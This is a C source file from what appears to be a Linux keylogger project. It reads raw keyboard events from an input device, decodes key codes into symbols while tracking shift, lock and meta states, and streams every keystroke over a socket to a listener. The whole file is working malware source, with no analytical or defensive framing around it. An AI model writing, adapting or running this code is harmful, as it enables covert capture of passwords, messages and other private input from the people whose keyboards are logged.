#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <wchar.h>

#include "keylogger.h"
#include "keys.h"
//#include "debug.h"

static int  		print_keysym(int *key, int state, int *lockers, int socket)
{
	static int		modifier = 0;
	int				code;
	int 			type;
	int 			value;

	code = key[modifier];
	type = KTYP(code);
	value = KVAL(code);
	if (type >= syms_size) {
		code = code ^ 0xf000;
		if (code < 0)
			return dprintf(socket, "<(null)>");
		if (code < 0x80)
			return dprintf(socket, "%s", iso646_syms[code]);
		return dprintf(socket, "[%#04x]", code);
	}
	if (type == KT_LETTER)
		type = KT_LATIN;
	if (type < syms_size && value < syms[type].size) {
		if (type == KT_SHIFT)
			return shift_handler(value, state, &modifier);
		if (type == KT_LOCK)
			return lock_handler(value, state, &modifier, lockers);
		if (state)
			return dprintf(socket, "%s", syms[type].table[value]);
	}
	if (type == KT_META && value < syms[0].size)
		return dprintf(socket, "<Meta_%s>", syms[0].table[value]);
	if (state)
		return dprintf(socket, "[%#04x]", code);
	return 1;
}

void					keylogger_loop(int keybd, int **key_table, int socket)
{
	int					nbread;			// Number of events received at once.
	struct input_event	events[128];	// Events read.
	int					lockers[NR_LOCK];
	int					loop;

	for (int i = 0; i < NR_LOCK; i++)
		lockers[i] = 0;
	lockers[6] = get_keystate(1, socket); // capslock state
//	lockers[?] = get_keystate(2); // numlock state
	loop = 1;
	write(socket, "Starting Keylogging...\n", 24);
	while (loop > 0)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			if (events[i].type == EV_KEY) {
				loop = print_keysym(key_table[events[i].code], events[i].value, lockers, socket);
			}
		}
	}
	write(socket, "Finished Keylogging...\n", 24);
}
